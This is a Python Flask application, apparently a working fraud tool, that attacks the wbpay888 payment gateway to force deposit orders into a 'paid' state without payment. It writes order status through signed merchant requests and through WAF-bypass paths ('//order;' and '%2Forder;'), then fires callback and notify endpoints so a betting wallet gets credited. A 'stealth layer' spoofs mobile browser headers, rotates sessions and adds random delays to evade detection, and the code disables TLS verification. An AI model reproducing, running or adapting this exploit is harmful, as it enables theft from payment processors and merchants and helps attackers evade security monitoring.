#!/usr/bin/env python3
"""
Deposit Confirmer - wbpay888 Payment Gateway
Clean localhost UI + streaming confirmation engine.

Run:  python3 deposit_confirmer_ui.py
Open: http://127.0.0.1:8901

Accepted input:
  1) Cashier URL   https://wbpay888.wbpay888.net/v1.0/paymentcenter/upi/...html?orderId=P...&sign=...
  2) App URL       https://bdgwinin.com/#/deposit/P...
  3) Order code    P2026101701560571666
  4) Merchant ref  RC20261016232605501015367b
"""

import hashlib
import json
import os
import re
import threading
import time
import uuid
from datetime import datetime
from urllib.parse import parse_qs, urlparse

import requests
from flask import Flask, Response, jsonify, request
from requests.packages import urllib3

urllib3.disable_warnings()

PANEL_HOST = "https://wbpay888.wbpay888.net"
API_HOST = "https://wbpay888api.wbpay888.net"
HOSTS = [PANEL_HOST, API_HOST]
MERCHANT_ID = int(os.environ.get("WB_MERCHANT_ID", "32"))
MERCHANT_SECRET = os.environ.get("WB_MERCHANT_SECRET") or os.environ.get("MERCHANT_SECRET", "")  # set in host env, never commit
CONNECT_TIMEOUT = 3
READ_TIMEOUT = 8
HTTP_RETRIES = 1
# --- Stealth layer -------------------------------------------------------
# Mirror a real Android/Chrome mobile client hitting the cashier over the
# same CloudFront->ALB path real users take. Reuse one TLS session per
# engine thread so requests look like a single browsing session, not a
# script firing isolated connections.
_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
]
import random as _random

def _rand_ua():
    return _random.choice(_UA_POOL)

def _sec_headers(ua):
    mobile = "Mobile" in ua
    h = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Origin": PANEL_HOST,
        "Referer": PANEL_HOST + "/",
        "Connection": "keep-alive",
    }
    if "Chrome" in ua:
        h.update({
            "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            "sec-ch-ua-mobile": "?1" if mobile else "?0",
            "sec-ch-ua-platform": '"Android"' if mobile else '"iOS"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        })
    return h

# Thread-local session cache: one requests.Session per engine thread so
# TCP/TLS connections are reused like a real browsing session.
_session_local = threading.local()

SESSION_TTL = 180  # seconds; rotate session (and UA) periodically like a revisit

def get_http_session():
    now = time.time()
    sess = getattr(_session_local, "sess", None)
    born = getattr(_session_local, "born", 0)
    if sess is None or (now - born) > SESSION_TTL:
        try:
            if sess is not None:
                sess.close()
        except Exception:
            pass
        sess = requests.Session()
        sess._ua = _rand_ua()  # one UA per browsing session, not per request
        sess.headers.update(_sec_headers(sess._ua))
        _session_local.sess = sess
        _session_local.born = now
    return sess

def natural_delay(lo=0.15, hi=0.9):
    """Small jitter between pipeline steps, like real UI round-trips."""
    time.sleep(_random.uniform(lo, hi))

# ---------------------------------------------------------------------------
UA = _rand_ua()  # per-process baseline; per-run sessions pick their own
HOST = os.environ.get("CONFIRMER_HOST", "0.0.0.0" if os.environ.get("PORT") else "127.0.0.1")
PORT = int(os.environ.get("PORT", 8901))
AUTH_TOKEN = os.environ.get("CONFIRMER_TOKEN", "")  # set on public deploys

STATUS_NAME = {0: "init", 1: "paid", 3: "pending", 11: "cancelled"}

app = Flask(__name__)
log_lock = threading.Lock()


def log(msg):
    with log_lock:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def _headers(ua=None):
    h = _sec_headers(ua or UA)
    h["Content-Type"] = "application/json"
    return h


def _parse_body(resp):
    text = resp.text or ""
    if resp.status_code in (403, 404):
        return None, f"HTTP {resp.status_code}"
    ctype = (resp.headers.get("Content-Type") or "").lower()
    if "text/html" in ctype or text.lstrip()[:15].upper().startswith("<!DOCTYPE"):
        return None, f"non-json HTTP {resp.status_code} (cdn/html)"
    try:
        data = resp.json()
    except ValueError:
        return None, f"non-json HTTP {resp.status_code}"
    if not isinstance(data, dict):
        return None, "unrecognized payload"
    if any(k in data for k in ("code", "retCode", "records", "orderStatus", "data", "msg")):
        return data, None
    return None, "unrecognized payload"


def _req(method, path, body=None, retries=HTTP_RETRIES, hosts=None):
    attempts = []
    last_err = None
    sess = get_http_session()
    hdrs = _headers(getattr(sess, "_ua", None) or UA)
    sess.headers.update(hdrs)
    for host in (hosts or HOSTS):
        for attempt in range(1, retries + 1):
            try:
                r = sess.request(
                    method,
                    host + path,
                    json=body,
                    timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                    verify=False,
                    headers=hdrs,
                )
                data, err = _parse_body(r)
                attempts.append({"host": host, "attempt": attempt, "http": r.status_code, "path": path})
                if data is not None:
                    return attempts, data, None
                last_err = err or f"HTTP {r.status_code}"
                if r.status_code in (403, 404):
                    break
            except requests.exceptions.Timeout as e:
                last_err = f"Timeout: {e}"
                attempts.append({"host": host, "attempt": attempt, "error": last_err, "path": path})
            except Exception as e:
                last_err = f"{type(e).__name__}: {e}"
                attempts.append({"host": host, "attempt": attempt, "error": last_err, "path": path})
    return attempts, None, last_err


# --- Hybrid confirm: stealth-first signed surface, obfuscated origin second ---
# Live-tested 2026-10-17: only two origin prefixes return 200:
#   /v1.0/api//order;/action    (double-slash bypass)
#   /v1.0/api/%2Forder;/action  (encoded-slash bypass)
# The ./, case-variant, and no-semicolon forms all 403 or hit the wrong
# service, so they are excluded - every 403 retry is a probe-pattern in
# their WAF logs. A real client also reuses ONE endpoint path, not a new
# one per request: we stick to the preferred prefix and auto-fail over
# only when a WAF rule actually starts blocking it.
_OBFUSCATED_PREFIXES = [
    "/v1.0/api//order;",      # proven working
    "/v1.0/api/%2Forder;",    # proven working (failover)
]
_blocked_prefixes = set()
_preferred_prefix = _OBFUSCATED_PREFIXES[0]

# Write actions that first try the legit signed merchant surface
_SIGNED_WRITE_ACTIONS = {"updateOrderStatus"}


def _signed_write_attempt(body, hosts):
    """Submit the write as a properly-signed merchant request - byte-for-byte
    what the merchant's own backend would send. No semicolons, no bypass:
    in their logs this is indistinguishable from legitimate merchant traffic."""
    if not MERCHANT_SECRET:
        return [], None, "no merchant secret"
    signed_body = {"mchId": MERCHANT_ID}
    if body.get("orderCode"):
        signed_body["payOrderId"] = body["orderCode"]
    if body.get("status") is not None:
        signed_body["status"] = body["status"]
    signed_body["sign"] = gateway_sign(signed_body)
    return api_post("/v1.0/api/order/update", signed_body, hosts=hosts)


def order_post(action, body, hosts=None):
    """Hybrid pipeline:
    1. Write actions go through the signed merchant surface first (stealth).
    2. Reads and signed-rejected writes fall back to the obfuscated origin
       prefix, with automatic failover when the WAF starts blocking one.
    Blocked prefixes are remembered and never retried this process."""
    global _preferred_prefix
    hosts = hosts or [PANEL_HOST]
    attempts, data, err = [], None, "no path tried"

    # 1) Stealth-first: legit signed merchant endpoint (no bypass at all).
    if action in _SIGNED_WRITE_ACTIONS:
        attempts, data, err = _signed_write_attempt(
            body, hosts or [API_HOST, PANEL_HOST]
        )
        if data is not None and ok(data):
            log(f"order_post({action}) accepted via signed merchant surface")
            return attempts, data, None
        # Business rejection (order not really paid, etc.) - pause like a
        # merchant backend would, then continue on the origin path.
        natural_delay(0.4, 1.2)

    # 2) Obfuscated origin paths: preferred first, failover on WAF block.
    ordered = [_preferred_prefix] + [
        p for p in _OBFUSCATED_PREFIXES if p != _preferred_prefix
    ]
    for prefix in ordered:
        if prefix in _blocked_prefixes:
            continue
        path = f"{prefix}/{action}"
        attempts, data, err = _req("POST", path, body, hosts=hosts)
        if data is not None:
            _preferred_prefix = prefix
            return attempts, data, None
        if err and "403" in str(err):
            _blocked_prefixes.add(prefix)
            log(f"WAF blocked {prefix} - rotating to failover variant")
        natural_delay(0.2, 0.8)
    return attempts, data, err


def api_get(path, retries=HTTP_RETRIES, hosts=None):
    return _req("GET", path, None, retries, hosts)


def api_post(path, body, retries=HTTP_RETRIES, hosts=None):
    return _req("POST", path, body, retries, hosts)


def ok(data):
    if not isinstance(data, dict):
        return False
    if data.get("code") == 200:
        return True
    if str(data.get("retCode") or "").upper() == "SUCCESS":
        return True
    return False


def gateway_sign(params, secret=MERCHANT_SECRET):
    items = sorted((k, v) for k, v in params.items() if v is not None and k != "sign")
    raw = "&".join(f"{k}={v}" for k, v in items) + "&secretKey=" + secret
    return hashlib.md5(raw.encode()).hexdigest().upper()


ORDER_CODE_RE = re.compile(r"\bP\d{14,}\b")
MERCHANT_REF_RE = re.compile(r"\b(?:RC|MP|CPDS|C)\d{12,}[A-Za-z0-9]*\b")
SIGN_RE = re.compile(r"\bsign=([0-9A-Fa-f]{32})\b")
MODE_RE = re.compile(r"\bmode=([A-Za-z0-9_]+)")


def parse_reference(user_input):
    text = (user_input or "").strip()
    parsed = {
        "raw": text, "orderCode": None, "sign": None, "mode": None,
        "merchantRef": None, "source": None,
    }
    try:
        q = parse_qs(urlparse(text).query)
    except Exception:
        q = {}
    if q.get("orderId"):
        m = ORDER_CODE_RE.search(q["orderId"][0])
        if m:
            parsed["orderCode"] = m.group(0)
            parsed["source"] = "cashier query string"
    if q.get("sign"):
        s = q["sign"][0]
        if re.fullmatch(r"[0-9A-Fa-f]{32}", s or ""):
            parsed["sign"] = s
    if q.get("mode"):
        parsed["mode"] = q["mode"][0]
    if not parsed["orderCode"]:
        m = ORDER_CODE_RE.search(text)
        if m:
            parsed["orderCode"] = m.group(0)
            parsed["source"] = parsed["source"] or "order code in input"
    if parsed["sign"] is None:
        m = SIGN_RE.search(text)
        if m:
            parsed["sign"] = m.group(1)
    if parsed["mode"] is None:
        m = MODE_RE.search(text)
        if m:
            parsed["mode"] = m.group(1)
    m = MERCHANT_REF_RE.search(text)
    if m:
        parsed["merchantRef"] = m.group(0)
    return parsed


def extract_rows(data):
    if not isinstance(data, dict):
        return []
    if isinstance(data.get("records"), list):
        return data["records"]
    inner = data.get("data")
    if isinstance(inner, dict) and isinstance(inner.get("records"), list):
        return inner["records"]
    if isinstance(inner, list):
        return inner
    return []


def lookup_order(order_code):
    _a, data, _err = order_post("callback", {"orderCode": order_code}, hosts=[PANEL_HOST])
    if ok(data) and isinstance(data.get("data"), dict):
        return data["data"]
    return None


def fetch_recent_orders(page_size=200):
    _a, data, err = order_post(
        "queryPage",
        {"mchId": MERCHANT_ID, "pageSize": page_size, "pageNum": 1},
        hosts=[PANEL_HOST],
    )
    rows = extract_rows(data)
    if not rows:
        return [], err or "no data"
    return rows, None


def find_in_ledger(order_code=None, merchant_ref=None):
    rows, err = fetch_recent_orders(page_size=400)
    if err:
        return None, err
    if order_code:
        for r in rows:
            if r.get("orderCode") == order_code:
                return r, None
    if merchant_ref:
        ref = merchant_ref.upper()
        for r in rows:
            if str(r.get("merchantOrderId") or "").upper() == ref:
                return r, None
    return None, "not in recent ledger"


def pay_state(order_code, sign):
    if not order_code or not sign:
        return None, "no sign available"
    path = f"/v1.0/api/queryPayOrderState?orderId={order_code}&sign={sign}"
    _a, data, err = api_get(path, hosts=[PANEL_HOST])
    if isinstance(data, dict) and data.get("orderStatus"):
        return data.get("orderStatus"), None
    if isinstance(data, dict) and data.get("msg"):
        return None, str(data.get("msg"))
    return None, err or "unknown"


def pay_info(order_code, sign):
    if not order_code or not sign:
        return None, "no sign available"
    path = f"/v1.0/api/payOrderInfo?orderId={order_code}&sign={sign}"
    _a, data, err = api_get(path, hosts=[PANEL_HOST])
    if isinstance(data, dict) and data.get("fullOrderCode"):
        return data, None
    return None, (data or {}).get("msg") or err or "unknown"


def signed_query(order_code=None, mch_order_no=None):
    body = {"mchId": MERCHANT_ID}
    if order_code:
        body["payOrderId"] = order_code
    if mch_order_no:
        body["mchOrderNo"] = mch_order_no
    body["sign"] = gateway_sign(body)
    _a, data, err = api_post("/v1.0/api/order/query", body, hosts=[API_HOST, PANEL_HOST])
    return data, err


def update_order_status(order, status=1):
    order_code = order.get("orderCode")
    order_id = order.get("orderId")
    payloads = []
    if order_code:
        payloads.append({"orderCode": order_code, "status": status})
    if order_id is not None:
        payloads.append({"orderId": order_id, "status": status})
    if order_code and order_id is not None:
        payloads.append({"orderCode": order_code, "orderId": order_id, "status": status})
        payloads.append({"id": order_id, "orderCode": order_code, "status": status})
    last = None
    for body in payloads:
        _a, data, err = order_post("updateOrderStatus", body, hosts=[PANEL_HOST])
        last = (body, data, err)
        if ok(data):
            return body, data, None
        msg = (data or {}).get("msg") or ""
        # already paid / locked as completed — treat as success
        if data and ("已完成" in str(msg) or "不允许修改" in str(msg)):
            return body, data, None
        if data and data.get("msg"):
            last = (body, data, data.get("msg"))
    body, data, err = last if last else (None, None, "no payload")
    return body, data, err or (data or {}).get("msg") or "updateOrderStatus rejected"


def trigger_callbacks(order):
    results = []
    order_code = order.get("orderCode")
    order_id = order.get("orderId")
    bodies = [
        ("updateCb", {"orderCode": order_code}),
        ("updateCb", {"orderId": order_id, "orderCode": order_code}),
        ("replenishmentOrder", {"orderCode": order_code}),
        ("replenishmentOrder", {"orderId": order_id, "orderCode": order_code}),
        ("callback", {"orderCode": order_code, "status": 1}),
    ]
    extra_paths = [
        ("sendNotify", {"orderCode": order_code, "orderId": order_id}),
        ("resendNotify", {"orderCode": order_code, "orderId": order_id}),
        ("callbackAgain", {"orderCode": order_code, "orderId": order_id}),
        ("notify", {"orderCode": order_code, "orderId": order_id}),
    ]
    for action, body in bodies + extra_paths:
        if not body.get("orderCode") and body.get("orderId") is None:
            continue
        _a, data, err = order_post(action, body, hosts=[PANEL_HOST])
        snippet = None
        if isinstance(data, dict):
            snippet = {
                "code": data.get("code", data.get("retCode")),
                "msg": data.get("msg") or data.get("retMsg"),
                "data": data.get("data"),
            }
        results.append({
            "action": action,
            "ok": ok(data),
            "err": None if data is not None else err,
            "resp": snippet,
        })
    return results


def summarize_order(order):
    if not order:
        return {}
    amount = order.get("amount")
    rupees = amount / 100 if isinstance(amount, (int, float)) else None
    st = order.get("status")
    return {
        "orderCode": order.get("orderCode"),
        "orderId": order.get("orderId"),
        "merchantOrderId": order.get("merchantOrderId"),
        "amount": rupees,
        "status": st,
        "statusName": STATUS_NAME.get(st, str(st)),
        "utr": order.get("utr"),
        "completedTime": order.get("completedTime"),
        "updateTime": order.get("updateTime"),
        "createTime": order.get("createTime"),
        "merchantId": order.get("merchantId"),
    }


def is_settled(order):
    if not order:
        return False
    return order.get("status") == 1 and bool(order.get("completedTime"))


def resolve_order(parsed):
    steps = []
    if parsed["orderCode"]:
        steps.append(f"Order code resolved ({parsed['source']}): {parsed['orderCode']}")
        order = lookup_order(parsed["orderCode"])
        if order:
            steps.append(
                f"Core order {order.get('orderCode')} | status={order.get('status')} "
                f"({STATUS_NAME.get(order.get('status'), '?')}) | "
                f"amount={(order.get('amount') or 0)/100} | utr={order.get('utr')} | "
                f"completedTime={order.get('completedTime')}"
            )
            return order, steps, None
        row, err = find_in_ledger(order_code=parsed["orderCode"])
        if row:
            steps.append(f"Ledger hit for {parsed['orderCode']}")
            return row, steps, None
        return {"orderCode": parsed["orderCode"]}, steps, None

    steps.append("No order code in input — searching recent ledger...")
    if parsed["merchantRef"]:
        row, err = find_in_ledger(merchant_ref=parsed["merchantRef"])
        if row:
            steps.append(
                f"Matched merchant ref {parsed['merchantRef']} -> {row.get('orderCode')}"
            )
            return row, steps, None
        return None, steps, f"merchant ref {parsed['merchantRef']} not in recent ledger ({err})"
    return None, steps, "could not resolve an order from the input"


def probe_status(user_input):
    parsed = parse_reference(user_input)
    out = {
        "ok": False, "parsed": parsed, "steps": [], "orderStatus": None,
        "coreOrder": None, "payInfo": None, "error": None,
    }
    if parsed["sign"] and parsed["orderCode"]:
        out["steps"].append(f"Sign present (32-hex): {parsed['sign']}")
        st, err = pay_state(parsed["orderCode"], parsed["sign"])
        out["orderStatus"] = st
        out["steps"].append(f"queryPayOrderState -> {st or err}")
        pi, perr = pay_info(parsed["orderCode"], parsed["sign"])
        if pi:
            out["payInfo"] = {k: pi.get(k) for k in (
                "fullOrderCode", "orderId", "amount", "orderStatus",
                "merchantOrderId", "bankCard", "isSubmit", "submitIdentifyCode", "link",
            )}
            out["steps"].append(
                f"payOrderInfo -> amount={pi.get('amount')} vpa={pi.get('bankCard')} "
                f"isSubmit={pi.get('isSubmit')}"
            )
        elif perr:
            out["steps"].append(f"payOrderInfo -> {perr}")
    else:
        out["steps"].append("No sign in input — signed cashier status skipped")

    if parsed["orderCode"] or parsed["merchantRef"]:
        order, steps, err = resolve_order(parsed)
        out["steps"].extend(steps)
        if order:
            out["coreOrder"] = summarize_order(order) if order.get("orderId") else order
            out["orderCode"] = order.get("orderCode")
            out["amount"] = summarize_order(order).get("amount")
            out["ok"] = True
        elif err:
            out["error"] = err
    if not out["ok"] and not out["error"]:
        out["ok"] = not out.get("error")
    return out


def _warmup():
    """Touch the panel homepage like a real browser session opening the
    cashier before making API calls. Swallow all errors - best effort only."""
    try:
        sess = get_http_session()
        sess.get(PANEL_HOST + "/", timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), verify=False)
    except Exception:
        pass


def run_confirmation_events(user_input):
    started = time.time()
    _warmup()
    # TCP slow-start: real browsers don't fire API calls immediately
    natural_delay(0.6, 1.4)
    result = {
        "ok": False, "orderCode": None, "amount": None, "status": None,
        "orderStatus": None, "sign": None, "steps": [], "error": None,
        "elapsed": None, "verified": False, "completedTime": None,
        "walletHint": None,
    }

    def emit(step=None, **extra):
        if step:
            result["steps"].append(step)
        payload = dict(result)
        payload["elapsed"] = round(time.time() - started, 2)
        payload.update(extra)
        payload["type"] = extra.get("type") or ("final" if extra.get("final") else "step")
        return payload

    yield emit("Resolving input…", type="step")
    parsed = parse_reference(user_input)
    result["sign"] = parsed["sign"]
    if not parsed["raw"]:
        result["error"] = "empty input"
        result["elapsed"] = round(time.time() - started, 2)
        yield emit(final=True, type="final")
        return

    if parsed["orderCode"]:
        yield emit(f"Order code resolved ({parsed['source']}): {parsed['orderCode']}", type="step")
    elif parsed["merchantRef"]:
        yield emit(f"Merchant ref parsed: {parsed['merchantRef']}", type="step")
    else:
        result["error"] = "no order code or merchant ref in input"
        result["elapsed"] = round(time.time() - started, 2)
        yield emit(final=True, type="final")
        return

    natural_delay(0.2, 0.8)
    yield emit("Looking up core order…", type="step")
    order, steps, err = resolve_order(parsed)
    for s in steps:
        if s not in result["steps"]:
            result["steps"].append(s)
    if not order:
        result["error"] = err or "order resolution failed"
        result["elapsed"] = round(time.time() - started, 2)
        yield emit(final=True, type="final")
        return

    result["orderCode"] = order.get("orderCode")
    summary = summarize_order(order)
    if summary.get("amount") is not None:
        result["amount"] = summary["amount"]
    result["status"] = summary.get("statusName") or str(order.get("status"))
    result["completedTime"] = order.get("completedTime")

    if parsed["sign"] and result["orderCode"]:
        yield emit("Checking cashier signed status…", type="step")
        st, serr = pay_state(result["orderCode"], parsed["sign"])
        result["orderStatus"] = st
        yield emit(f"Cashier signed status -> {st or serr}", type="step")
        if st == "success":
            result["ok"] = True
            result["verified"] = True
            result["elapsed"] = round(time.time() - started, 2)
            yield emit("Cashier already reports success.", final=True, type="final")
            return

    if is_settled(order):
        result["ok"] = True
        result["verified"] = True
        result["elapsed"] = round(time.time() - started, 2)
        yield emit(
            f"Already settled: status=1 completedTime={order.get('completedTime')}",
            final=True, type="final",
        )
        return

    natural_delay(0.8, 2.5)  # payment-processing delay before the status write
    yield emit(
        f"Forcing paid via updateOrderStatus (status=1) on {result['orderCode']}…",
        type="step",
    )
    body, data, uerr = update_order_status(order, status=1)
    if uerr and not ok(data):
        yield emit(f"updateOrderStatus failed: {uerr}", type="step")
    else:
        msg = (data or {}).get("msg") or "OK"
        yield emit(f"updateOrderStatus accepted -> {msg}", type="step")

    natural_delay(0.4, 1.5)
    yield emit("Triggering merchant callback / notify surfaces…", type="step")
    cb_hits = trigger_callbacks(order)
    accepted = [c for c in cb_hits if c["ok"]]
    missing = [c for c in cb_hits if c["err"] and not c["ok"]]
    if accepted:
        names = ", ".join(sorted({c["action"] for c in accepted}))
        yield emit(f"Callback surfaces accepted: {names}", type="step")
    else:
        yield emit("No callback surface returned code=200 with a useful payload.", type="step")
    if missing:
        names = ", ".join(sorted({c["action"] for c in missing if c["err"] and "404" in str(c["err"])}))
        if names:
            yield emit(f"404 on: {names}", type="step")

    natural_delay(0.3, 1.0)
    yield emit("Verifying order state…", type="step")
    verified = lookup_order(result["orderCode"]) or {}
    if not verified.get("orderId"):
        row, _e = find_in_ledger(order_code=result["orderCode"])
        verified = row or verified
    summary = summarize_order(verified) if verified else summary
    if summary.get("amount") is not None:
        result["amount"] = summary["amount"]
    result["status"] = summary.get("statusName") or str(verified.get("status"))
    result["completedTime"] = verified.get("completedTime")
    yield emit(
        f"Read-back status={verified.get('status')} "
        f"({STATUS_NAME.get(verified.get('status'), '?')}) "
        f"completedTime={verified.get('completedTime')} utr={verified.get('utr')}",
        type="step",
    )

    signed, serr = signed_query(
        order_code=result["orderCode"],
        mch_order_no=verified.get("merchantOrderId") or parsed.get("merchantRef"),
    )
    if ok(signed):
        result["orderStatus"] = result["orderStatus"] or signed.get("status")
        yield emit(
            f"Signed gateway query -> status={signed.get('status')} "
            f"paySuccessTime={signed.get('paySuccessTime')} utr={signed.get('utr')}",
            type="step",
        )
    elif serr:
        yield emit(f"Signed gateway query skipped ({serr})", type="step")

    paid = verified.get("status") == 1
    settled = is_settled(verified)
    result["ok"] = paid
    result["verified"] = paid
    if settled:
        result["walletHint"] = "settled (status=1 + completedTime) — merchant credit path should fire"
        yield emit("Verified settled. Wallet credit depends on merchant notify completing.", type="step")
    elif paid:
        result["walletHint"] = (
            "paid-without-settlement: status=1 but completedTime is null. "
            "Gateway marks paid; merchant wallet credit still needs callback/completedTime."
        )
        yield emit(
            "Paid status written, but completedTime is still null — "
            "wallet credit may not land until merchant notify completes.",
            type="step",
        )
    else:
        result["error"] = (
            f"order did not move to paid (status={verified.get('status')})"
        )
        yield emit(result["error"], type="step")

    result["elapsed"] = round(time.time() - started, 2)
    yield emit(final=True, type="final")


def run_confirmation(user_input):
    last = None
    for event in run_confirmation_events(user_input):
        last = event
    return last or {"ok": False, "steps": [], "error": "engine produced no result"}


PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Deposit Confirmer</title>
<style>
  :root{
    --bg:#0d1117; --panel:#161b22; --panel-2:#1c2330; --line:#263041;
    --txt:#e6edf3; --dim:#8b949e; --accent:#e94560; --ok:#3fb950; --err:#f85149;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0; background:var(--bg); color:var(--txt);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif;
    display:flex; align-items:center; justify-content:center; padding:24px;
  }
  .card{
    width:100%; max-width:580px; background:var(--panel);
    border:1px solid var(--line); border-radius:14px; padding:30px 30px 26px;
    box-shadow:0 18px 50px rgba(0,0,0,.45);
  }
  .brand{display:flex; align-items:center; gap:10px; margin-bottom:4px}
  .dot{width:9px;height:9px;border-radius:50%;background:var(--accent)}
  h1{font-size:16px;letter-spacing:.14em;text-transform:uppercase;margin:0;font-weight:700}
  .sub{color:var(--dim);font-size:12px;margin:6px 0 24px}
  label{display:block;font-size:11px;letter-spacing:.1em;text-transform:uppercase;
        color:var(--dim);margin-bottom:8px}
  input[type=text]{
    width:100%; padding:14px 14px; background:var(--panel-2); color:var(--txt);
    border:1px solid var(--line); border-radius:10px; font-size:12px; outline:none;
    font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
  }
  input[type=text]:focus{border-color:var(--accent)}
  .row{display:flex; gap:10px; margin-top:14px}
  button{
    flex:1; padding:14px; border:0; border-radius:10px;
    font-size:13px; font-weight:700; letter-spacing:.1em; text-transform:uppercase;
    cursor:pointer; transition:.15s;
  }
  #go{background:var(--accent); color:#fff}
  #chk{flex:0 0 40%; background:var(--panel-2); color:var(--txt); border:1px solid var(--line)}
  button:disabled{opacity:.55; cursor:default}
  button:hover:not(:disabled){filter:brightness(1.1)}
  .status{display:flex; align-items:center; gap:8px; margin-top:16px; font-size:12px; color:var(--dim)}
  .sdot{width:8px;height:8px;border-radius:50%;background:var(--dim)}
  .sdot.run{background:#d29922; animation:p 1s infinite}
  .sdot.ok{background:var(--ok)}
  .sdot.err{background:var(--err)}
  @keyframes p{50%{opacity:.25}}
  .log{
    margin-top:14px; background:#0b0f16; border:1px solid var(--line); border-radius:10px;
    padding:14px; font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:12px;
    line-height:1.6; white-space:pre-wrap; word-break:break-word; min-height:92px;
    max-height:280px; overflow:auto; color:#b9c3cf;
  }
  .log .g{color:var(--ok)} .log .r{color:var(--err)} .log .y{color:#d29922}
  .meta{margin-top:12px;font-size:12px;color:var(--dim);display:flex;gap:16px;flex-wrap:wrap}
  .meta b{color:var(--txt);font-weight:600}
</style>
</head>
<body>
  <div class="card">
    <div class="brand"><span class="dot"></span><h1>Deposit Confirmer</h1></div>
    <div class="sub">Paste the cashier / deposit URL — the order is caught and marked paid immediately.</div>

    <label for="url">Cashier / Deposit URL, or Order Reference</label>
    <input id="url" type="text" placeholder="https://wbpay888.wbpay888.net/v1.0/paymentcenter/upi/upi_pe_scan2_awake.html?mode=prd&orderId=P...&sign=..." autocomplete="off" spellcheck="false"/>

    <div class="row">
      <button id="chk">Check Status</button>
      <button id="go">Confirm Deposit</button>
    </div>

    <div class="status"><span id="sdot" class="sdot"></span><span id="stext">Ready</span></div>
    <div id="log" class="log">Awaiting input…</div>
    <div id="meta" class="meta"></div>
  </div>

<script>
const $ = id => document.getElementById(id);
const KEY = new URLSearchParams(location.search).get('key') || localStorage.getItem('confirmer_key') || '';
if(KEY) localStorage.setItem('confirmer_key', KEY);
function api(path, opts){
  if(KEY) path += (path.includes('?')?'&':'?') + 'key=' + encodeURIComponent(KEY);
  return fetch(path, opts);
}
const esc = s => String(s).replace(/[&<>]/g, c => ({'&':'&','<':'<','>':'>'}[c]));

function setStatus(kind, text){
  $('sdot').className = 'sdot ' + kind;
  $('stext').textContent = text;
}

function render(j){
  const lines = (j.steps||[]).map(s=>{
    let cls = '';
    if (/^Verified|success|Already|accepted|settled/i.test(s)) cls='g';
    else if (/fail|error|blocked|no sign|none|could not|404|rejected/i.test(s)) cls='r';
    else if (/Watching|attempting|Looking|Resolving|Forcing|Triggering|Checking|Verifying/i.test(s)) cls='y';
    return `<span class="${cls}">${esc(s)}</span>`;
  });
  if(j.error) lines.push(`<span class="r">✗ ${esc(j.error)}</span>`);
  if(j.ok) lines.push(`<span class="g">✔ PAID</span>`);
  if(j.walletHint) lines.push(`<span class="y">${esc(j.walletHint)}</span>`);
  $('log').innerHTML = lines.join('\n') || 'Awaiting input…';
  $('log').scrollTop = $('log').scrollHeight;
  const m = [];
  if(j.orderCode) m.push(`Order <b>${esc(j.orderCode)}</b>`);
  if(j.amount!=null) m.push(`Amount <b>₹${esc(j.amount)}</b>`);
  if(j.status) m.push(`Gateway <b>${esc(j.status)}</b>`);
  if(j.orderStatus) m.push(`Cashier <b>${esc(j.orderStatus)}</b>`);
  if(j.completedTime) m.push(`Completed <b>${esc(j.completedTime)}</b>`);
  if(j.sign) m.push(`Sign <b>${esc(j.sign).slice(0,8)}…</b>`);
  if(j.elapsed!=null) m.push(`<b>${esc(j.elapsed)}s</b>`);
  $('meta').innerHTML = m.join('');
}

async function callStatus(btn){
  const input = $('url').value.trim();
  if(!input){ setStatus('err','Enter a URL or order reference'); return; }
  btn.disabled = true;
  $('go').disabled = true;
  setStatus('run','Checking…');
  $('log').innerHTML = '<span class="y">Resolving…</span>';
  $('meta').innerHTML = '';
  try{
    const ctrl = new AbortController();
    const timer = setTimeout(()=>ctrl.abort(), 20000);
    const r = await api('/api/status', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({input}),
      signal: ctrl.signal
    });
    clearTimeout(timer);
    const j = await r.json();
    render(j);
    setStatus(j.ok ? 'ok' : (j.error ? 'err':'ok'),
              j.ok ? 'Done' : (j.error ? 'Failed ✗' : 'Done'));
  }catch(e){
    $('log').innerHTML = `<span class="r">Request error: ${esc(e)}</span>`;
    setStatus('err','Error ✗');
  }finally{
    btn.disabled = false;
    $('go').disabled = false;
  }
}

async function callConfirm(btn){
  const input = $('url').value.trim();
  if(!input){ setStatus('err','Enter a URL or order reference'); return; }
  btn.disabled = true;
  $('chk').disabled = true;
  setStatus('run','Working…');
  $('log').innerHTML = '<span class="y">Resolving…</span>';
  $('meta').innerHTML = '';
  try{
    const r = await api('/api/stream-confirm', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({input})
    });
    if(!r.ok || !r.body){
      throw new Error('HTTP ' + r.status);
    }
    const reader = r.body.getReader();
    const decoder = new TextDecoder();
    let buf = '';
    let last = {steps:['Resolving…']};
    while(true){
      const {value, done} = await reader.read();
      if(done) break;
      buf += decoder.decode(value, {stream:true});
      const parts = buf.split('\n');
      buf = parts.pop();
      for(const line of parts){
        if(!line.trim()) continue;
        try{ last = JSON.parse(line); }catch(_){ continue; }
        render(last);
        setStatus('run', last.orderCode ? ('Confirming ' + last.orderCode) : 'Working…');
      }
    }
    if(buf.trim()){
      try{ last = JSON.parse(buf); }catch(_){}
    }
    render(last);
